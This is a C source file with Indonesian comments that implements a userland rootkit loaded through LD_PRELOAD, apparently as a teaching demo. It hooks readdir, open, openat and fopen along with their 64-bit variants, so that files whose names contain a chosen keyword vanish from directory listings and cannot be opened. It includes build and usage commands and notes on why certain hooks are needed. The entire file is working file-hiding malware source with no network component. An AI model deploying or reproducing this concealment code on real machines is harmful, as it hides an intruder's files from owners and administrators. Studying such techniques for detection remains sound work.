// preload-hide.c — Hook userland via LD_PRELOAD (interposisi libc).
//
// Ini "rootkit userland" paling sederhana: kita mengekspor fungsi dengan nama
// sama seperti libc. Dynamic linker memuat library ini LEBIH DULU, jadi semua
// panggilan dari proses target (ls, find, ...) memanggil versi kita.
//
// PENTING (pelajaran nyata dari demo): jangan hook getdents64 — ls tidak
// memanggilnya lewat PLT (readdir di libc memanggil getdents64 secara
// INTERNAL, jadi interposisi tidak kena). Hook readdir64/readdir, titik
// masuk yang memang dipanggil aplikasi.
//
// Yang di-hook:
//   - readdir64/readdir : sembunyikan entry direktori mengandung "rahasia"
//   - openat/open/openat64/open64/fopen/fopen64 : sembunyikan file dari akses
//     langsung. fopen tidak memanggil open lewat PLT (glibc memakai simbol
//     internal __open), jadi ia harus di-hook terpisah — tanpa ini `cat`
//     yang memakai stdio tetap bisa membuka file "rahasia".
//
// Build : gcc -shared -fPIC -O2 -o preload-hide.so preload-hide.c -ldl
// Pakai : LD_PRELOAD=$PWD/preload-hide.so ls /tmp
//
// Catatan keamanan: variadic `mode` WAJIB diteruskan saat O_CREAT/O_TMPFILE.
// Tanpa itu kernel membaca register keempat yang tidak diinisialisasi sebagai
// permission, sehingga file bisa lahir dengan mode acak — termasuk bit
// setuid/setgid bila proses berjalan sebagai root.

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

// Kata kunci file yang disembunyikan. Ganti bebas.
#define HIDDEN_MARK "rahasia"

static int is_variadic_create(int flags) {
#ifdef O_TMPFILE
    if ((flags & O_TMPFILE) == O_TMPFILE) return 1;
#endif
    return (flags & O_CREAT) != 0;
}

// Baca mode dari argumen variadic hanya bila kernel memang memakainya.
static mode_t take_mode(int flags, va_list ap) {
    return is_variadic_create(flags) ? (mode_t)va_arg(ap, mode_t) : 0;
}

// ============ hook readdir64 ============
// ls/find memanggil readdir64 (64-bit). Kita wrapper: panggil fungsi asli
// via dlsym(RTLD_NEXT), lewati entry yang mengandung kata kunci.
struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*real_readdir64)(DIR *);
    if (!real_readdir64)
        real_readdir64 = (struct dirent64 *(*)(DIR *))dlsym(RTLD_NEXT, "readdir64");
    if (!real_readdir64) {
        errno = ENOSYS;
        return NULL;
    }
    struct dirent64 *d;
    while ((d = real_readdir64(dirp)) != NULL)
        if (!strstr(d->d_name, HIDDEN_MARK))
            break;
    return d;
}

// ============ hook readdir (versi 32-bit/legacy) ============
struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real_readdir)(DIR *);
    if (!real_readdir)
        real_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");
    if (!real_readdir) {
        errno = ENOSYS;
        return NULL;
    }
    struct dirent *d;
    while ((d = real_readdir(dirp)) != NULL)
        if (!strstr(d->d_name, HIDDEN_MARK))
            break;
    return d;
}

// ============ hook openat / open (+ varian 64-bit) ============
// Tolak buka file yang mengandung kata kunci. `mode` diteruskan apa adanya
// saat O_CREAT/O_TMPFILE (lihat catatan keamanan di atas).
int openat(int dirfd, const char *pathname, int flags, ...) {
    va_list ap;
    va_start(ap, flags);
    const mode_t mode = take_mode(flags, ap);
    va_end(ap);

    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return (int)syscall(SYS_openat, dirfd, pathname, flags, mode);
}

int open(const char *pathname, int flags, ...) {
    va_list ap;
    va_start(ap, flags);
    const mode_t mode = take_mode(flags, ap);
    va_end(ap);

    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return (int)syscall(SYS_open, pathname, flags, mode);
}

int openat64(int dirfd, const char *pathname, int flags, ...) {
    va_list ap;
    va_start(ap, flags);
    const mode_t mode = take_mode(flags, ap);
    va_end(ap);

    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return (int)syscall(SYS_openat, dirfd, pathname, flags, mode);
}

int open64(const char *pathname, int flags, ...) {
    va_list ap;
    va_start(ap, flags);
    const mode_t mode = take_mode(flags, ap);
    va_end(ap);

    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return -1;
    }
    return (int)syscall(SYS_open, pathname, flags, mode);
}

// ============ hook fopen / fopen64 ============
// glibc mengimplementasikan fopen di atas simbol internal (__open), jadi
// interposisi open() tidak menangkapnya. Hook titik masuk stdio-nya langsung.
FILE *fopen(const char *pathname, const char *mode) {
    static FILE *(*real_fopen)(const char *, const char *);
    if (!real_fopen) real_fopen = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen");
    if (!real_fopen) {
        errno = ENOSYS;
        return NULL;
    }
    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return NULL;
    }
    return real_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode) {
    static FILE *(*real_fopen64)(const char *, const char *);
    if (!real_fopen64)
        real_fopen64 = (FILE *(*)(const char *, const char *))dlsym(RTLD_NEXT, "fopen64");
    if (!real_fopen64) {
        errno = ENOSYS;
        return NULL;
    }
    if (pathname && strstr(pathname, HIDDEN_MARK)) {
        errno = ENOENT;
        return NULL;
    }
    return real_fopen64(pathname, mode);
}
